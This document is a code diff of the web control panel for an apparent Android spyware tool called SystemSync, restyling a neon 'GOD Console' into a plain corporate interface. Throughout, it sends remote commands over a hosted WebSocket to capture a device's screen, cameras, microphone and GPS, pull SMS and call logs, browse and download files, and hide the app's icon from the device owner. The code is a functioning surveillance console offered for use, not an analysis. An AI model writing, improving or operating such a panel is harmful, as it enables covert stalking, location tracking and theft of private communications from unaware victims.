@@ -1,479 +1,613 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>SystemSync GOD Console</title>
+    <title>SystemSync Console</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
     <style>
-        /* (keep your existing CSS – unchanged) */
+        /* ===== GLOBAL ===== */
         body{
             margin:0;
-            background:radial-gradient(circle at top,#050505,#000);
-            color:#00f7ff;
-            font-family:Consolas,monospace;
+            background:#f5f7fa;  /* light professional background */
+            font-family: 'Segoe UI', system-ui, sans-serif;
             display:flex;
             height:100vh;
             overflow:hidden;
         }
+
+        /* ===== SIDEBAR ===== */
         #sidebar{
-            width:300px;
-            background:linear-gradient(180deg,#020202,#000);
-            border-right:1px solid #00f7ff22;
+            width:280px;
+            background:white;
+            border-right:1px solid #e0e4e8;
             padding:20px;
-            box-shadow:0 0 30px #00f7ff11;
             overflow-y:auto;
+            box-shadow:2px 0 5px rgba(0,0,0,0.02);
         }
+
         .logo{
             font-size:20px;
-            letter-spacing:3px;
-            margin-bottom:25px;
-            color:#00f7ff;
+            font-weight:600;
+            color:#1976ff;
+            margin-bottom:30px;
         }
+
         .section{
             margin-bottom:25px;
         }
+
         .section-title{
-            font-size:11px;
-            letter-spacing:2px;
-            color:#00f7ff88;
-            margin-bottom:10px;
+            font-size:12px;
+            font-weight:600;
+            color:#7b8a9b;
+            text-transform:uppercase;
+            letter-spacing:0.5px;
+            margin-bottom:12px;
         }
+
         button{
             width:100%;
-            padding:10px;
-            margin:6px 0;
-            background:#000;
-            color:#00f7ff;
-            border:1px solid #00f7ff55;
-            border-radius:6px;
+            padding:10px 12px;
+            margin:4px 0;
+            background:white;
+            color:#1a2634;
+            border:1px solid #d0d9e2;
+            border-radius:8px;
+            font-size:14px;
+            text-align:left;
             cursor:pointer;
-            transition:.25s;
+            transition:0.2s;
+            display:flex;
+            align-items:center;
+            gap:8px;
         }
+
         button:hover{
-            background:#00f7ff;
-            color:#000;
-            box-shadow:0 0 12px #00f7ff;
+            background:#1976ff;
+            color:white;
+            border-color:#1976ff;
         }
-        button.small{
-            width:auto;
-            float:right;
-            margin:0 0 0 5px;
-            padding:4px 8px;
-        }
+
+        /* ===== MAIN PANEL ===== */
         #main{
             flex:1;
             display:flex;
             flex-direction:column;
+            min-width:0;
+            background:#f5f7fa;
         }
+
         #header{
             height:60px;
-            border-bottom:1px solid #00f7ff22;
+            background:white;
+            border-bottom:1px solid #e0e4e8;
             display:flex;
             align-items:center;
             justify-content:space-between;
             padding:0 25px;
-            background:#020202;
+            font-weight:600;
+            color:#1a2634;
         }
-        .status{
-            padding:5px 14px;
-            border-radius:20px;
-            font-size:12px;
-            border:1px solid #00f7ff55;
+
+        #status{
+            padding:6px 16px;
+            border-radius:30px;
+            background:#e8f0fe;
+            color:#1976ff;
+            font-weight:500;
         }
+
         #content{
             flex:1;
-            display:flex;
-            gap:20px;
             padding:20px;
+            overflow:auto;
         }
-        #video-panel{
-            flex:2;
-            background:#020202;
+
+        /* SINGLE CONTENT PANEL */
+        #main-panel{
+            background:white;
             border-radius:12px;
-            border:1px solid #00f7ff33;
-            box-shadow:0 0 40px #00f7ff11 inset;
-            display:flex;
-            align-items:center;
-            justify-content:center;
-            min-height:300px;
+            box-shadow:0 2px 8px rgba(0,0,0,0.05);
+            padding:20px;
+            min-height:100%;
         }
-        video, img{
+
+        /* ===== MAP ===== */
+        #map{
+            height:400px;
+            border-radius:10px;
+        }
+
+        /* ===== TABLES ===== */
+        table{
             width:100%;
-            height:100%;
-            object-fit:contain;
-            border-radius:12px;
+            border-collapse:collapse;
+            font-size:14px;
         }
-        #data-panel{
-            flex:1;
-            background:#020202;
-            border-radius:12px;
-            border:1px solid #00f7ff33;
-            overflow-y:auto;
-            padding:15px;
+        th{
+            background:#f8fafd;
+            color:#1a2634;
+            font-weight:600;
+            padding:12px 10px;
+            text-align:left;
+            border-bottom:2px solid #e0e4e8;
         }
-        .card{
-            background:#000;
-            border-left:3px solid #00f7ff;
-            padding:8px;
-            margin-bottom:8px;
-            font-size:12px;
+        td{
+            padding:10px;
+            border-bottom:1px solid #eef2f5;
+            color:#2c3e50;
             word-break:break-word;
         }
-        .card button{
-            width:auto;
-            float:right;
-            margin-left:5px;
-            padding:2px 6px;
+        tr:hover{
+            background:#f5f9ff;
         }
-        #map{
-            height:300px;
+
+        /* ===== FILE EXPLORER ===== */
+        .file-item{
+            display:flex;
+            align-items:center;
+            padding:10px 12px;
+            border-bottom:1px solid #eef2f5;
+            cursor:pointer;
+            gap:10px;
+        }
+        .file-item:hover{
+            background:#f5f9ff;
+        }
+        .file-icon{
+            font-size:18px;
+            width:24px;
+            text-align:center;
+        }
+        .file-name{
+            flex:1;
+            color:#1a2634;
+        }
+        .file-size{
+            color:#7b8a9b;
+            font-size:13px;
+            margin-right:15px;
+        }
+
+        /* ===== PAGINATION ===== */
+        .pagination{
+            margin-top:20px;
+            display:flex;
+            gap:8px;
+            justify-content:center;
+        }
+        .page-btn{
+            padding:6px 12px;
+            border:1px solid #d0d9e2;
+            background:white;
+            border-radius:6px;
+            cursor:pointer;
+            color:#1a2634;
+        }
+        .page-btn:hover{
+            background:#1976ff;
+            color:white;
+            border-color:#1976ff;
+        }
+
+        /* ===== IMAGES & VIDEO ===== */
+        img, video{
+            max-width:100%;
+            max-height:70vh;
             border-radius:8px;
-            margin-bottom:15px;
+            display:block;
+            margin:0 auto;
         }
+
+        /* ===== AUDIO PLAYER ===== */
         audio{
             width:100%;
-            margin-top:10px;
+            margin-top:15px;
         }
     </style>
 </head>
 <body>
 
 <div id="sidebar">
-    <div class="logo">SYSTEMSYNC</div>
+    <div class="logo">SystemSync</div>
+
     <div class="section">
-        <div class="section-title">SURVEILLANCE</div>
-        <button onclick="startScreen()">🖥 SCREEN MIRROR</button>
-        <button onclick="stopScreen()">⏹ STOP SCREEN</button>
-        <button onclick="send('camFront')">📹 FRONT CAMERA</button>
-        <button onclick="send('camBack')">📹 BACK CAMERA</button>
-        <button onclick="send('getLocation')">📍 LIVE GPS</button>
-        <button onclick="send('startAudio')">🎤 START MIC</button>
-        <button onclick="send('stopAudio')">⏹ STOP MIC</button>
+        <div class="section-title">Surveillance</div>
+        <button onclick="toggleScreen()"><span>🖥</span> <span id="screenBtn">Start Screen</span></button>
+        <button onclick="toggleFrontCam()"><span>📷</span> <span id="frontCamBtn">Front Camera</span></button>
+        <button onclick="toggleBackCam()"><span>📷</span> <span id="backCamBtn">Back Camera</span></button>
+        <button onclick="toggleMic()"><span>🎤</span> <span id="micBtn">Start Mic</span></button>
+        <button onclick="send('getLocation')"><span>📍</span> GPS Location</button>
     </div>
+
     <div class="section">
-        <div class="section-title">DATA</div>
-        <button onclick="send('ls root')">📂 FILE MANAGER</button>
-        <button onclick="send('getSMS inbox')">💬 SMS LOGS</button>
-        <button onclick="send('getCallLogs')">📞 CALL LOGS</button>
+        <div class="section-title">Data</div>
+        <button onclick="send('ls root')"><span>📂</span> File Manager</button>
+        <button onclick="send('getSMS inbox')"><span>💬</span> SMS Logs</button>
+        <button onclick="send('getCallLogs')"><span>📞</span> Call Logs</button>
     </div>
+
     <div class="section">
-        <div class="section-title">CONTROL</div>
-        <button id="iconToggle" onclick="toggleAppIcon()">👻 HIDE APP ICON</button>
-        <button onclick="send('vibrate 1000')">📳 VIBRATE (1s)</button>
+        <div class="section-title">Control</div>
+        <button onclick="toggleAppIcon()"><span>👻</span> <span id="iconBtn">Hide Icon</span></button>
+        <button onclick="send('vibrate 1000')"><span>📳</span> Vibrate (1s)</button>
     </div>
 </div>
 
 <div id="main">
     <div id="header">
-        <div>GOD CONTROL PANEL</div>
-        <div id="status" class="status">CONNECTING...</div>
+        <div>Control Panel</div>
+        <div id="status">CONNECTING</div>
     </div>
     <div id="content">
-        <div id="video-panel">
-            <video id="remoteVideo" autoplay playsinline style="display:none;"></video>
-            <div id="placeholder">No video feed</div>
-        </div>
-        <div id="data-panel">
-            <div id="map"></div>
-            <div id="data"></div>
-            <div id="audio-container"></div>
+        <div id="main-panel">
+            Ready.
         </div>
     </div>
 </div>
 
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <script>
-    // ---------- CONFIGURATION ----------
-    const WS_URL = "wss://mirror-view.onrender.com";  // Your Render WebSocket URL
+    // ---------- CONFIG ----------
+    const WS_URL = "wss://mirror-view.onrender.com";
 
-    // ---------- GLOBAL STATE ----------
+    // ---------- GLOBALS ----------
     let ws;
+    let pc = null;                     // WebRTC peer
     let mapInstance = null;
-    let pc = null;                     // WebRTC peer connection for screen share
-    let iconHidden = false;             // track icon state
+    let currentData = [];               // for pagination
+    let currentPage = 0;
+    let dataType = null;                // 'sms', 'call', 'file'
+
+    // Toggle states
+    let screenActive = false;
+    let frontCamActive = false;
+    let backCamActive = false;
+    let micActive = false;
+    let iconHidden = false;
+
+    const panel = document.getElementById('main-panel');
 
     // ---------- CONNECTION ----------
-    function connectWebSocket() {
+    function connect() {
         ws = new WebSocket(WS_URL);
         ws.onopen = () => {
-            console.log('WebSocket connected');
+            console.log('Connected');
             ws.send("I_AM_WEB");
             setStatus("ONLINE");
         };
-        ws.onmessage = (event) => {
-            const msg = event.data;
+        ws.onmessage = (e) => {
+            const msg = e.data;
             console.log('Received:', msg);
 
-            // --- Status updates ---
+            // Status
             if (msg.startsWith("STATUS:")) {
                 setStatus(msg.substring(7));
             }
-            // --- GPS location ---
+            // GPS
             else if (msg.startsWith("LOC_DATA:")) {
                 try {
                     const data = JSON.parse(msg.substring(9));
                     renderMap(data);
-                } catch (e) {
-                    console.error('Invalid location data', e);
+                } catch (err) {
+                    console.error(err);
                 }
             }
-            // --- File list ---
+            // File list
             else if (msg.startsWith("FILE_LIST:")) {
                 try {
-                    const files = JSON.parse(msg.substring(10));
-                    renderFiles(files);
-                } catch (e) {
-                    console.error('Invalid file list', e);
+                    currentData = JSON.parse(msg.substring(10));
+                    dataType = 'file';
+                    renderFiles();
+                } catch (err) {
+                    console.error(err);
                 }
             }
-            // --- File download data ---
-            else if (msg.startsWith("FILE_DATA:")) {
-                const base64 = msg.substring(10);
-                downloadBase64File(base64, "downloaded_file");
-            }
-            // --- SMS logs ---
+            // SMS
             else if (msg.startsWith("SMS_DATA:")) {
                 try {
-                    const smsData = JSON.parse(msg.substring(9));
-                    renderLogs(smsData, "SMS Logs");
-                } catch (e) {
-                    console.error('Invalid SMS data', e);
+                    currentData = JSON.parse(msg.substring(9));
+                    dataType = 'sms';
+                    renderTable();
+                } catch (err) {
+                    console.error(err);
                 }
             }
-            // --- Call logs ---
+            // Call logs
             else if (msg.startsWith("CALL_DATA:")) {
                 try {
-                    const callData = JSON.parse(msg.substring(10));
-                    renderLogs(callData, "Call Logs");
-                } catch (e) {
-                    console.error('Invalid call logs', e);
+                    currentData = JSON.parse(msg.substring(10));
+                    dataType = 'call';
+                    renderTable();
+                } catch (err) {
+                    console.error(err);
                 }
             }
-            // --- Camera image ---
+            // Camera image
             else if (msg.startsWith("CAMERA_IMAGE:")) {
                 const base64 = msg.substring(13);
-                displayImage(base64);
+                showImage(base64);
             }
-            // --- Audio recording (file) ---
+            // Audio file
             else if (msg.startsWith("AUDIO_RECORDING:")) {
                 const base64 = msg.substring(16);
-                playAudio(base64);
+                showAudio(base64);
             }
             else if (msg.startsWith("AUDIO_STARTED")) {
-                showNotification("Audio recording started");
+                micActive = true;
+                document.getElementById('micBtn').innerText = 'Stop Mic';
+                showNotification('Mic started');
             }
             else if (msg.startsWith("AUDIO_STOPPED")) {
-                showNotification("Audio recording stopped");
+                micActive = false;
+                document.getElementById('micBtn').innerText = 'Start Mic';
+                showNotification('Mic stopped');
             }
-            // --- Screen share ---
+            // Screen share
             else if (msg.startsWith("SCREEN_SHARE_STARTED")) {
-                showNotification("Screen sharing started");
+                screenActive = true;
+                document.getElementById('screenBtn').innerText = 'Stop Screen';
+                showNotification('Screen share started');
             }
             else if (msg.startsWith("SCREEN_SHARE_STOPPED")) {
-                stopScreenShare();
-                showNotification("Screen sharing stopped");
+                screenActive = false;
+                document.getElementById('screenBtn').innerText = 'Start Screen';
+                if (pc) { pc.close(); pc = null; }
+                showNotification('Screen share stopped');
             }
             else if (msg.startsWith("RTC_OFFER:screen:")) {
-                const sdp = msg.substring(17);
-                handleOffer(sdp);
+                handleOffer(msg.substring(17));
             }
             else if (msg.startsWith("ICE_CANDIDATE:")) {
-                const candidateStr = msg.substring(14);
-                handleIceCandidate(candidateStr);
+                handleIceCandidate(msg.substring(14));
             }
-            // --- App icon responses ---
+            // App icon
             else if (msg.startsWith("APP_HIDDEN")) {
                 iconHidden = true;
-                document.getElementById("iconToggle").innerHTML = "👀 SHOW APP ICON";
-                showNotification("App icon hidden");
+                document.getElementById('iconBtn').innerText = 'Show Icon';
             }
             else if (msg.startsWith("APP_SHOWN")) {
                 iconHidden = false;
-                document.getElementById("iconToggle").innerHTML = "👻 HIDE APP ICON";
-                showNotification("App icon shown");
+                document.getElementById('iconBtn').innerText = 'Hide Icon';
             }
-            // --- Vibration ---
+            // Vibration
             else if (msg.startsWith("VIBRATE_DONE")) {
-                showNotification("Vibration completed");
+                showNotification('Vibration done');
             }
-            // --- Errors ---
+            // Error
             else if (msg.startsWith("ERROR:")) {
-                alert("Error: " + msg.substring(6));
-            }
-            else {
-                console.log('Unhandled message:', msg);
+                panel.innerHTML = `<div style="color:#d32f2f;">Error: ${msg.substring(6)}</div>`;
             }
         };
         ws.onclose = () => {
-            console.log('WebSocket disconnected');
             setStatus('OFFLINE');
-            setTimeout(connectWebSocket, 5000);
+            setTimeout(connect, 5000);
         };
-        ws.onerror = (err) => {
-            console.error('WebSocket error', err);
-        };
+        ws.onerror = console.error;
     }
 
-    // ---------- PLAIN TEXT COMMAND SENDING ----------
+    function setStatus(s) {
+        const el = document.getElementById('status');
+        el.innerText = s;
+        el.style.background = s === 'ONLINE' ? '#e8f5e9' : '#ffebee';
+        el.style.color = s === 'ONLINE' ? '#2e7d32' : '#c62828';
+    }
+
+    // ---------- COMMAND ----------
     function send(cmd) {
         if (ws && ws.readyState === WebSocket.OPEN) {
             ws.send(cmd);
         } else {
-            alert('Not connected to server');
+            alert('Not connected');
         }
     }
 
-    // ---------- STATUS UI ----------
-    function setStatus(text) {
-        const el = document.getElementById('status');
-        el.innerText = text;
-        el.style.borderColor = text === 'ONLINE' ? '#00ff99' : '#ff4444';
-        el.style.color = text === 'ONLINE' ? '#00ff99' : '#ff4444';
+    // ---------- TOGGLES ----------
+    function toggleScreen() {
+        if (screenActive) send('STOP_SCREEN_SHARE');
+        else send('START_SCREEN_SHARE');
     }
 
-    // ---------- MAP ----------
-    function renderMap(data) {
-        if (mapInstance) mapInstance.remove();
-        mapInstance = L.map('map').setView([data.lat, data.lon], 18);
-        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(mapInstance);
-        L.circle([data.lat, data.lon], { radius: data.acc || data.accuracy, color: '#00f7ff' }).addTo(mapInstance);
+    function toggleFrontCam() {
+        if (frontCamActive) {
+            frontCamActive = false;
+            document.getElementById('frontCamBtn').innerText = 'Front Camera';
+        } else {
+            send('camFront');
+            frontCamActive = true;
+            document.getElementById('frontCamBtn').innerText = 'Stop Front';
+            // Auto revert after 5s (camera stops after one shot)
+            setTimeout(() => {
+                if (frontCamActive) {
+                    frontCamActive = false;
+                    document.getElementById('frontCamBtn').innerText = 'Front Camera';
+                }
+            }, 5000);
+        }
     }
 
-    // ---------- FILE BROWSER (card style) ----------
-    function renderFiles(files) {
-        let html = '<h3>File Manager</h3>';
-        html += files.map(f => `
-            <div class="card">
-                ${f.isDir ? '📁' : '📄'} ${f.name} (${formatBytes(f.size)})
-                <button class="small" onclick="send('${f.isDir ? 'ls ' + f.path : 'dl ' + f.path}')">
-                    ${f.isDir ? 'OPEN' : 'DL'}
-                </button>
-            </div>
-        `).join('');
-        document.getElementById('data').innerHTML = html;
+    function toggleBackCam() {
+        if (backCamActive) {
+            backCamActive = false;
+            document.getElementById('backCamBtn').innerText = 'Back Camera';
+        } else {
+            send('camBack');
+            backCamActive = true;
+            document.getElementById('backCamBtn').innerText = 'Stop Back';
+            setTimeout(() => {
+                if (backCamActive) {
+                    backCamActive = false;
+                    document.getElementById('backCamBtn').innerText = 'Back Camera';
+                }
+            }, 5000);
+        }
     }
 
-    function formatBytes(bytes) {
-        if (bytes === 0) return '0 B';
-        const k = 1024;
-        const sizes = ['B', 'KB', 'MB', 'GB'];
-        const i = Math.floor(Math.log(bytes) / Math.log(k));
-        return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
+    function toggleMic() {
+        if (micActive) send('stopAudio');
+        else send('startAudio');
     }
 
-    // ---------- LOGS (SMS/Call) ----------
-    function renderLogs(data, title) {
-        let html = `<h3>${title}</h3>`;
-        html += data.map(item => `<div class="card">${JSON.stringify(item, null, 2)}</div>`).join('');
-        document.getElementById('data').innerHTML = html;
+    function toggleAppIcon() {
+        if (iconHidden) send('showApp');
+        else send('hideApp');
     }
 
-    // ---------- CAMERA IMAGE ----------
-    function displayImage(base64Image) {
-        const videoPanel = document.getElementById('video-panel');
-        videoPanel.innerHTML = `<img src="data:image/jpeg;base64,${base64Image}" style="max-width:100%; max-height:100%;">`;
+    // ---------- RENDERERS ----------
+    function showImage(base64) {
+        panel.innerHTML = `<img src="data:image/jpeg;base64,${base64}">`;
     }
 
-    // ---------- AUDIO PLAYBACK (recorded file) ----------
-    function playAudio(base64Audio) {
-        const audioContainer = document.getElementById('audio-container');
-        audioContainer.innerHTML = `
-            <audio controls src="data:audio/3gp;base64,${base64Audio}"></audio>
-            <button onclick="downloadBase64File('${base64Audio}', 'recording.3gp')">Download Audio</button>
+    function showAudio(base64) {
+        panel.innerHTML = `
+            <audio controls src="data:audio/3gp;base64,${base64}"></audio>
+            <button onclick="download('${base64}', 'recording.3gp')">Download</button>
         `;
     }
 
-    // ---------- DOWNLOAD BASE64 FILE ----------
-    function downloadBase64File(base64, filename) {
-        const link = document.createElement('a');
-        link.href = 'data:application/octet-stream;base64,' + base64;
-        link.download = filename;
-        link.click();
+    function download(b64, name) {
+        const a = document.createElement('a');
+        a.href = 'data:application/octet-stream;base64,' + b64;
+        a.download = name;
+        a.click();
     }
 
-    // ---------- NOTIFICATION (temporary) ----------
-    function showNotification(text) {
-        const status = document.getElementById('status');
-        const original = status.innerText;
-        status.innerText = text;
-        setTimeout(() => { status.innerText = original; }, 2000);
+    function renderMap(loc) {
+        panel.innerHTML = '<div id="map"></div>';
+        if (mapInstance) mapInstance.remove();
+        mapInstance = L.map('map').setView([loc.lat, loc.lon], 18);
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(mapInstance);
+        L.circle([loc.lat, loc.lon], { radius: loc.acc || loc.accuracy, color: '#1976ff' }).addTo(mapInstance);
     }
 
-    // ---------- TOGGLE APP ICON ----------
-    function toggleAppIcon() {
-        if (iconHidden) {
-            send('showApp');
-        } else {
-            send('hideApp');
-        }
-        // Button text updates when we receive APP_SHOWN / APP_HIDDEN
-    }
-
-    // ---------- WEBRTC SCREEN SHARING ----------
-    async function startScreen() {
-        if (!ws || ws.readyState !== WebSocket.OPEN) {
-            alert('Not connected');
+    // Table render with pagination
+    function renderTable() {
+        if (!currentData || currentData.length === 0) {
+            panel.innerHTML = '<p>No data</p>';
             return;
         }
-        send('START_SCREEN_SHARE');
-        document.getElementById('video-panel').innerHTML = '<video id="remoteVideo" autoplay playsinline></video>';
-        showNotification("Waiting for screen stream...");
-    }
 
-    function stopScreen() {
-        send('STOP_SCREEN_SHARE');
-        stopScreenShare();
-    }
+        // Prepare columns based on dataType
+        let headers = [];
+        let rows = [];
 
-    function stopScreenShare() {
-        if (pc) {
-            pc.close();
-            pc = null;
+        if (dataType === 'sms') {
+            headers = ['Type', 'Number', 'Message', 'Date'];
+            rows = currentData.map(item => [item.type, item.number, item.body, item.date]);
+        } else if (dataType === 'call') {
+            headers = ['Type', 'Number', 'Name', 'Date', 'Duration'];
+            rows = currentData.map(item => [
+                item.type,
+                item.number,
+                item.name || '',
+                item.date,
+                item.duration + 's'   // keep raw duration
+            ]);
+        } else {
+            // fallback
+            panel.innerHTML = '<p>Unknown data type</p>';
+            return;
         }
-        document.getElementById('video-panel').innerHTML = '<div id="placeholder">Screen sharing stopped</div>';
+
+        const pageSize = 20;
+        const totalPages = Math.ceil(rows.length / pageSize);
+        const start = currentPage * pageSize;
+        const pageRows = rows.slice(start, start + pageSize);
+
+        let html = '<table><thead><tr>';
+        headers.forEach(h => html += `<th>${h}</th>`);
+        html += '</tr></thead><tbody>';
+
+        pageRows.forEach(r => {
+            html += '<tr>';
+            r.forEach(cell => html += `<td>${cell}</td>`);
+            html += '</tr>';
+        });
+        html += '</tbody></table>';
+
+        // Pagination
+        if (totalPages > 1) {
+            html += '<div class="pagination">';
+            for (let i = 0; i < totalPages; i++) {
+                html += `<button class="page-btn" onclick="gotoPage(${i})">${i+1}</button>`;
+            }
+            html += '</div>';
+        }
+
+        panel.innerHTML = html;
     }
 
+    function gotoPage(p) {
+        currentPage = p;
+        renderTable();
+    }
+
+    // File explorer
+    function renderFiles() {
+        if (!currentData || currentData.length === 0) {
+            panel.innerHTML = '<p>No files found</p>';
+            return;
+        }
+        let html = '<div class="file-list">';
+        currentData.forEach(f => {
+            html += `
+                <div class="file-item" onclick="handleFile('${f.path}', ${f.isDir})">
+                    <span class="file-icon">${f.isDir ? '📁' : '📄'}</span>
+                    <span class="file-name">${f.name}</span>
+                    <span class="file-size">${f.isDir ? '' : formatBytes(f.size)}</span>
+                </div>
+            `;
+        });
+        html += '</div>';
+        panel.innerHTML = html;
+    }
+
+    function handleFile(path, isDir) {
+        if (isDir) send('ls ' + path);
+        else send('dl ' + path);
+    }
+
+    function formatBytes(b) {
+        if (b === 0) return '0 B';
+        const k = 1024, sizes = ['B','KB','MB','GB'];
+        const i = Math.floor(Math.log(b)/Math.log(k));
+        return (b/Math.pow(k,i)).toFixed(1) + ' ' + sizes[i];
+    }
+
+    // ---------- WEBRTC ----------
     function handleOffer(sdp) {
         if (!pc) {
-            pc = new RTCPeerConnection({
-                iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
-            });
-            pc.ontrack = (event) => {
-                const video = document.getElementById('remoteVideo');
-                if (video && event.streams && event.streams[0]) {
-                    video.srcObject = event.streams[0];
-                    video.style.display = 'block';
-                }
+            pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+            pc.ontrack = (e) => {
+                panel.innerHTML = '<video autoplay playsinline></video>';
+                document.querySelector('video').srcObject = e.streams[0];
             };
-            pc.onicecandidate = (event) => {
-                if (event.candidate) {
-                    ws.send('ICE_CANDIDATE:' + JSON.stringify(event.candidate));
-                }
+            pc.onicecandidate = (e) => {
+                if (e.candidate) ws.send('ICE_CANDIDATE:' + JSON.stringify(e.candidate));
             };
         }
-        const offer = new RTCSessionDescription({ type: 'offer', sdp: sdp });
-        pc.setRemoteDescription(offer)
+        pc.setRemoteDescription({ type: 'offer', sdp })
             .then(() => pc.createAnswer())
-            .then(answer => pc.setLocalDescription(answer))
-            .then(() => {
-                ws.send('ANSWER:' + pc.localDescription.sdp);
-            })
-            .catch(e => console.error('Error handling offer:', e));
+            .then(a => pc.setLocalDescription(a))
+            .then(() => ws.send('ANSWER:' + pc.localDescription.sdp))
+            .catch(console.error);
     }
 
     function handleIceCandidate(candidateStr) {
         if (!pc) return;
         try {
-            const candidate = new RTCIceCandidate(JSON.parse(candidateStr));
-            pc.addIceCandidate(candidate);
-        } catch (e) {
-            console.error('Invalid ICE candidate', e);
-        }
+            pc.addIceCandidate(new RTCIceCandidate(JSON.parse(candidateStr)));
+        } catch (e) { console.error(e); }
     }
 
-    // ---------- INIT ----------
-    window.onload = () => {
-        connectWebSocket();
-    };
+    function showNotification(text) {
+        const status = document.getElementById('status');
+        const orig = status.innerText;
+        status.innerText = text;
+        setTimeout(() => { status.innerText = orig; }, 2000);
+    }
+
+    // ---------- START ----------
+    connect();
 </script>
 </body>
 </html>
